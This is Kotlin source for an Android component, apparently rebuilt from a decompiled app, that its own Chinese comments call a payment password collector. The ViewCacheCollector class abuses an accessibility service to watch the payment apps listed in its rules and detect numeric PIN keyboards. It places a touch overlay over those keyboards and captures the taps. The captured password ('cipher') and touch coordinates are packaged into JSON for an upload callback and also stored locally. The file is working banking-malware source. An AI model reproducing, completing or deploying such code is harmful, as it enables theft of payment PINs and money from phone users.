package com.storm.safe.rock.service.modules.cipher

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import java.util.LinkedHashSet
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference
import org.json.JSONArray
import org.json.JSONObject

/**
 * 支付规则条目。
 *
 * JADX: aa1 类 (p000 包)
 */
data class PaymentRule(
    val packageName: String,
    val winClasses: ArrayList<String>,
    val appName: String
)

/**
 * 支付界面密码收集器 — 监控支付应用窗口变化并捕获密码输入。
 *
 * JADX: C0341a7.java (563 行)
 * 方法映射:
 *   a0 → addRule           (添加支付规则)
 *   a1 → getRulePackages   (获取规则包名列表)
 *   a2 → loadStrategies    (加载本地策略)
 *   a3 → onWindowChanged   (窗口变化处理)
 *   a4 → detectKeyboard    (检测数字键盘)
 *   a5 → removeRule        (移除规则)
 *   a6 → collectDigitNodes (递归收集数字节点)
 *   a7 → checkKeyboardGone (检查键盘是否消失)
 *   a8 → setPaymentMode    (设置支付模式)
 *   a9 → setRules          (批量设置规则)
 *   b0 → startCapture      (启动捕获)
 *   b1 → stopAndUpload     (停止并上传)
 *   b2 → stopCapture       (停止捕获)
 */
class ViewCacheCollector(
    @Volatile var service: AccessibilityService,
    val context: Context
) {

    companion object {
        private const val TAG = "VCC"

        /** 工厂单例 (C0340a6) */
        @Volatile
        var instance: ViewCacheCollector? = null

        /**
         * 获取或创建实例。
         * vendor: C0340a6.getInstance(svc, ctx)
         */
        fun getInstance(service: AccessibilityService, context: Context): ViewCacheCollector {
            synchronized(this) {
                var inst = instance
                if (inst == null) {
                    inst = ViewCacheCollector(service, context)
                    instance = inst
                    // 设置 CipherExtractor 上传回调
                    CipherExtractor.uploadCallback = { result ->
                        inst.onCipherExtracted(result)
                    }
                } else {
                    inst.service = service
                }
                return inst
            }
        }

        /**
         * 递归收集数字节点。
         * vendor: a6
         */
        fun collectDigitNodes(node: AccessibilityNodeInfo, digits: LinkedHashSet<String>) {
            try {
                if (!node.isVisibleToUser) return

                val text = node.text?.toString()
                val desc = node.contentDescription?.toString()
                val viewId = node.viewIdResourceName ?: ""

                var digitStr: String? = null

                val trimText = text?.trim()
                val trimDesc = desc?.trim()

                if (trimText != null && trimText.length == 1 && Character.isDigit(trimText[0])) {
                    digitStr = trimText
                } else if (trimDesc != null && trimDesc.length == 1 && Character.isDigit(trimDesc[0])) {
                    digitStr = trimDesc
                } else if (viewId.contains(":id/") &&
                    !viewId.contains("delete", ignoreCase = true) &&
                    !viewId.contains("enter", ignoreCase = true) &&
                    !viewId.contains("cancel", ignoreCase = true)) {
                    val lastChar = viewId.lastOrNull()
                    if (lastChar != null && Character.isDigit(lastChar)) {
                        digitStr = lastChar.toString()
                    }
                }

                if (digitStr != null) digits.add(digitStr)

                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    collectDigitNodes(child, digits)
                }
            } catch (_: Exception) {}
        }
    }

    // ==================== 字段 ====================

    /** 支付规则列表 */
    val rules: CopyOnWriteArrayList<PaymentRule> = CopyOnWriteArrayList()

    /** 当前监控的包名 */
    val currentPackage: AtomicReference<String?> = AtomicReference(null)

    /** 当前 app 名称 */
    val currentAppName: AtomicReference<String?> = AtomicReference(null)

    /** 是否正在捕获 */
    val isCapturing: AtomicBoolean = AtomicBoolean(false)

    /** 当前窗口类名 */
    @Volatile
    var currentClassName: String? = null

    /** 备用包名 */
    @Volatile
    var fallbackPkg: String = ""

    /** 备用 app 名称 */
    @Volatile
    var fallbackAppName: String = ""

    /** 备用类名 */
    @Volatile
    var fallbackClassName: String = ""

    /** Handler */
    val handler: Handler = Handler(Looper.getMainLooper())

    /** SharedPreferences (lazy) */
    private val prefs by lazy {
        context.getSharedPreferences("vc_cache", 0)
    }

    /** 是否正在探测键盘 */
    val isProbing: AtomicBoolean = AtomicBoolean(false)

    /** 支付模式 */
    @Volatile
    var paymentModeActive: Boolean = false

    /** 支付模式变化回调 */
    var onPaymentModeChanged: ((Boolean) -> Unit)? = null

    /** 结果上传回调 */
    var onResultUpload: ((JSONObject) -> Unit)? = null

    /** 当前匹配的规则 */
    @Volatile
    var matchedRule: PaymentRule? = null

    /** 探测中的包名/类名 */
    @Volatile
    var probingPkg: String = ""
    @Volatile
    var probingClassName: String = ""

    /** 键盘探测 Runnable */
    private val probeKeyboardRunnable: Runnable = Runnable {
        isProbing.set(false)
        if (!isCapturing.get()) {
            val rule = matchedRule ?: return@Runnable
            val pkg = probingPkg
            val cls = probingClassName
            if (!detectKeyboard()) {
                Log.d(TAG, "未发现支付键盘: pkg=$pkg, cls=$cls")
                // 延迟重试
                handler.postDelayed(Runnable {
                    if (!isCapturing.get() && matchedRule != null) {
                        startCapture(probingPkg, probingClassName)
                    }
                }, 800L)
            } else {
                Log.d(TAG, "🎯 UI 探测发现支付键盘！pkg=$pkg, cls=$cls → 启动遮罩")
                currentAppName.set(rule.appName)
                startCapture(pkg, cls)
            }
        }
    }

    /** 键盘消失检查 Runnable */
    private val checkKeyboardGoneRunnable: Runnable = Runnable {
        if (isCapturing.get()) {
            if (!detectKeyboard()) {
                Log.d(TAG, "🏁 键盘已消失，密码输入完成 → 上传并移除遮罩")
                stopAndUpload()
            } else {
                Log.d(TAG, "键盘仍在，继续捕获")
            }
        }
    }

    // ==================== 公共方法 ====================

    /**
     * 添加支付规则。
     * vendor: a0
     */
    fun addRule(packageName: String, winClasses: ArrayList<String>, appName: String) {
        rules.removeAll { it.packageName == packageName }
        rules.add(PaymentRule(packageName, winClasses, appName))
        Log.d(TAG, "规则已添加: $packageName ($appName), winClasses=$winClasses")
    }

    /**
     * 获取规则包名列表。
     * vendor: a1
     */
    fun getRulePackages(): ArrayList<String> {
        return ArrayList(rules.map { it.packageName })
    }

    /**
     * 从本地加载支付策略。
     * vendor: a2
     */
    fun loadStrategies() {
        try {
            val json = context.getSharedPreferences("payment_strategies", 0)
                .getString("strategies", null) ?: return
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val pkg = obj.optString("packageName", "")
                val appName = obj.optString("appName", "")
                val winClassesArr = obj.optJSONArray("listenWinClasses")
                val winClasses = ArrayList<String>()
                if (winClassesArr != null) {
                    for (j in 0 until winClassesArr.length()) {
                        winClasses.add(winClassesArr.getString(j))
                    }
                }
                if (pkg.isNotEmpty()) {
                    addRule(pkg, winClasses, appName)
                }
            }
            Log.d(TAG, "✅ 已从本地加载 ${arr.length()} 条支付策略")
        } catch (_: Exception) {}
    }

    /**
     * 窗口变化处理 — 核心路由。
     * vendor: a3
     */
    fun onWindowChanged(packageName: String, className: String) {
        if (rules.isEmpty()) return

        val rule = rules.find { it.packageName == packageName }
        if (rule != null) {
            Log.v(TAG, "🔍 窗口变化: pkg=$packageName, cls=$className, 规则winClasses=${rule.winClasses}")
        }

        if (rule == null) {
            // 不在规则列表中
            if (TouchViewManager.EXCLUDE_PACKAGES.contains(packageName) ||
                packageName.startsWith("com.android.providers.") ||
                packageName.startsWith("com.android.internal.")) return

            val currentPkg = currentPackage.get()
            if (currentPkg == null || packageName == context.packageName) return

            // 离开支付应用
            Log.d(TAG, "离开支付应用 ($currentPkg -> $packageName)，停止捕获并上传")
            isProbing.set(false)
            handler.removeCallbacks(probeKeyboardRunnable)
            handler.removeCallbacks(checkKeyboardGoneRunnable)
            stopAndUpload()
            return
        }

        // 规则匹配
        if (rule.winClasses.isEmpty()) {
            // 无 winClasses 约束 → 任何窗口都匹配
            if (currentPackage.get() == packageName) {
                Log.d(TAG, "同包名内窗口切换 ($currentClassName -> $className)，检查键盘是否消失")
                currentClassName = className
                checkKeyboardGone()
                return
            }
            if (isCapturing.get() || isProbing.getAndSet(true)) return
            matchedRule = rule
            probingPkg = packageName
            probingClassName = className
            handler.removeCallbacks(probeKeyboardRunnable)
            handler.postDelayed(probeKeyboardRunnable, 500L)
            Log.d(TAG, "📋 已调度 UI 键盘探测 (500ms): pkg=$packageName, cls=$className")
            return
        }

        // 有 winClasses 约束 → 匹配类名
        val matched = rule.winClasses.any { cls ->
            className.contains(cls) || cls == className
        }
        if (matched) {
            isProbing.set(false)
            handler.removeCallbacks(probeKeyboardRunnable)
            handler.removeCallbacks(checkKeyboardGoneRunnable)

            val currentPkg = currentPackage.get()
            if (currentPkg == packageName && currentClassName == className) return

            Log.d(TAG, "✓ 规则命中: pkg=$packageName, cls=$className, app=${rule.appName}")
            if (currentPkg == packageName) {
                if (currentClassName != null && currentClassName != className) {
                    Log.d(TAG, "同包名页面切换 ($currentClassName -> $className)，检查键盘是否消失")
                    checkKeyboardGone()
                }
            } else {
                if (currentPkg != null) stopAndUpload()
                currentAppName.set(rule.appName)
                startCapture(packageName, className)
            }
            currentClassName = className
        } else {
            val currentPkg = currentPackage.get()
            if (currentPkg == packageName && isCapturing.get()) {
                Log.d(TAG, "同包名窗口切换到非支付页 ($currentClassName -> $className)，检查键盘是否消失")
                currentClassName = className
                checkKeyboardGone()
            } else if (currentPkg == packageName) {
                currentClassName = className
            }
        }
    }

    /**
     * 检测当前界面是否有数字键盘（10个数字按钮）。
     * vendor: a4
     */
    fun detectKeyboard(): Boolean {
        val digits = LinkedHashSet<String>()
        try {
            val windows = service.windows
            if (windows != null) {
                for (window in windows) {
                    val root = window.root ?: continue
                    collectDigitNodes(root, digits)
                    if (digits.size >= 10) break
                }
            }
            if (digits.size < 10) {
                val root = service.rootInActiveWindow
                if (root != null) collectDigitNodes(root, digits)
            }
            Log.d(TAG, "键盘探测: 找到 ${digits.size} 个数字按钮 ($digits)")
        } catch (_: Exception) {}
        return digits.size >= 10
    }

    /**
     * 移除规则。
     * vendor: a5
     */
    fun removeRule(packageName: String) {
        rules.removeAll { it.packageName == packageName }
        if (currentPackage.get() == packageName) {
            stopCapture()
        }
    }

    /**
     * 检查键盘是否消失。
     * vendor: a7
     */
    fun checkKeyboardGone() {
        if (isCapturing.get()) {
            handler.removeCallbacks(checkKeyboardGoneRunnable)
            handler.postDelayed(checkKeyboardGoneRunnable, 500L)
        }
    }

    /**
     * 设置支付模式。
     * vendor: a8
     */
    fun setPaymentMode(mode: Boolean) {
        if (paymentModeActive != mode) {
            paymentModeActive = mode
            onPaymentModeChanged?.invoke(mode)
            Log.d(TAG, "支付模式: $mode")
        }
    }

    /**
     * 批量设置规则。
     * vendor: a9
     */
    fun setRules(newRules: ArrayList<PaymentRule>) {
        rules.clear()
        rules.addAll(newRules)
        Log.d(TAG, "规则已设置: ${rules.map { "${it.packageName}(${it.winClasses.size}cls)" }}")
    }

    /**
     * 启动密码捕获。
     * vendor: b0
     */
    fun startCapture(packageName: String, className: String) {
        Log.d(TAG, "▶ 启动overlay: pkg=$packageName, cls=$className")
        currentPackage.set(packageName)
        isCapturing.set(true)
        currentClassName = className
        setPaymentMode(true)

        val helper = ListenHelper().apply { a0 = 0 }
        TouchViewManager.listenHelper = helper
        TouchViewManager.accessibilityService = service
        // 通过 handler 在主线程设置覆盖层
        handler.post {
            TouchViewManager.setupTouchOverlay(service)
        }
    }

    /**
     * 停止并上传。
     * vendor: b1
     */
    fun stopAndUpload() {
        if (isCapturing.get()) {
            Log.d(TAG, "⏹ 停止并上传")
            isCapturing.set(false)
            val pkg = currentPackage.get() ?: ""
            fallbackPkg = pkg
            val appName = currentAppName.get() ?: ""
            fallbackAppName = appName
            val cls = currentClassName
            fallbackClassName = cls ?: ""
            // 触发 teardown
            TouchViewManager.teardown(true)
        }
        currentPackage.set(null)
        currentAppName.set(null)
        currentClassName = null
        setPaymentMode(false)
    }

    /**
     * 停止捕获（不上传）。
     * vendor: b2
     */
    fun stopCapture() {
        Log.d(TAG, "🔴 停止捕获")
        isCapturing.set(false)
        currentPackage.set(null)
        currentAppName.set(null)
        setPaymentMode(false)
        TouchViewManager.teardown(false)
    }

    // ==================== 内部方法 ====================

    /**
     * 密码提取完成回调。
     */
    private fun onCipherExtracted(result: CipherResult) {
        val pkg = currentPackage.get() ?: fallbackPkg
        val appName = currentAppName.get() ?: fallbackAppName
        val cls = currentClassName ?: fallbackClassName

        try {
            val json = JSONObject()
            json.put("type", "view_cache_sync")
            json.put("pkg", pkg)
            json.put("cls", cls)
            json.put("app", appName)
            json.put("cipher", result.textCipher ?: "")
            json.put("grade", result.cipherGradeCode ?: "")
            json.put("ts", System.currentTimeMillis())

            // 坐标和属性数据
            val coordsArray = JSONArray()
            val propsArray = JSONArray()
            synchronized(TouchViewManager.cipherDataHolder) {
                for (point in TouchViewManager.cipherDataHolder.touchPoints) {
                    coordsArray.put(JSONObject().apply {
                        put("x", point.x.toDouble())
                        put("y", point.y.toDouble())
                    })
                }
                for (resp in TouchViewManager.cipherDataHolder.propResponses) {
                    propsArray.put(JSONObject().apply {
                        put("i", resp.targetIndex)
                        put("p", resp.prop)
                        put("v", resp.value)
                        put("t", resp.timestamp)
                    })
                }
            }
            json.put("coords", coordsArray)
            json.put("cnt", coordsArray.length())
            json.put("props", propsArray)

            Log.d(TAG, "✅ 密码提取成功: ${result.textCipher}, pkg=$pkg, app=$appName")
            onResultUpload?.invoke(json)

            // 保存到本地
            try {
                prefs.edit()
                    .putString("last_result", json.toString())
                    .putString("last_cipher", json.optString("cipher", ""))
                    .putLong("last_ts", System.currentTimeMillis())
                    .apply()
            } catch (_: Exception) {}
        } catch (e: Exception) {
            Log.e(TAG, "onCipherExtracted error: ${e.message}")
        }

        // 重置状态
        currentPackage.set(null)
        currentAppName.set(null)
        fallbackPkg = ""
        fallbackAppName = ""
        fallbackClassName = ""
    }
}
